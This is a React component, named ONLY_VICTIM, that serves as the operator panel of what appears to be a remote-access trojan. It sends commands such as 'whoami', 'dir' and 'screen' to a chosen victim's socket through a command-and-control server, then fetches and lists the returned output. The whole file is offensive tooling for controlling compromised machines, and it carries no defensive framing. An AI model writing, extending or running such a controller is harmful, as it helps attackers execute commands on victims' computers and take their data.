import React, { useEffect, useState } from 'react'
import {io} from "socket.io-client"
// import "./command.css"
import axios from 'axios'

const ONLY_VICTIM = () => {
    const [command , setCommand ] = useState("whoami")
    const [socket_text , setSocketText ] = useState("")
    const [all_data , setAllData] = useState([] ?? [])
    
    const handle_command = async() => {
        try {
            const socket = await io.connect(process.env.REACT_APP_SOCKET_URL_LOCAL)
            await socket.emit("command_one",  {text : command , ip : socket_text})
        } catch (error) {
            console.log(error)
        }
    }

    const handle_getdata = async() => {
        try {
            axios({
                url : process.env.REACT_APP_SOCKET_URL_LOCAL + "command/data",
                method : "GET"
            })
            .then(res => {
                setAllData(res.data.data)
            })
            .catch(err => {
                return 0
            })
        } catch (error) {
            return 0
        }
    }
  return (
    <div className='command_container'>
        <div className='command_controller'>
            <h2>--- ONE TARGET ---</h2>
            <select className='list_select' value={command} onChange={(e) => {
                setCommand(e.target.value)
            }}>
                <option value={"whoami"}>
                    whoami
                </option>
                <option value={"dir"}>
                    dir
                </option>
                <option value={"screen"}>
                    screen
                </option>
            </select>
            {socket_text ? <input className='submit-command' type='submit' onClick={handle_command} /> : <input className='submit-command' type='submit'/>}
            <input className='socket_input'
            placeholder='socket_ip ...'
            type='text' name='socket' value={socket_text} 
            onChange={(e) => {
                setSocketText(e.target.value)
            }}/>
            {socket_text ? <button className='btn_getData' onClick={handle_getdata}>GETDATA</button> : <button className='cant_btn_getData'>GETDATA</button>}
            
        </div>
        <div className='data_command'>
            <div id="elf">
                {all_data?.map((el , index) => {
                    if (el.whoami) {
                        return <h1 class='data_recv_elf'>
                            <div className='nummer'><p>{index}</p></div>
                            <div className='data_true'>{el?.whoami}</div>
                        </h1>
                    }else if (el.dir) {
                        return <h1 class='data_recv_elf'>
                        <div className='nummer'>{index}</div>
                            <div className='data_true'>{el?.dir}</div>
                        </h1>
                    }else {
                        return <h1 class='data_recv_elf'>command not found</h1>
                    }
                })}
            </div>
        </div>
    </div>
  )
}

export default ONLY_VICTIM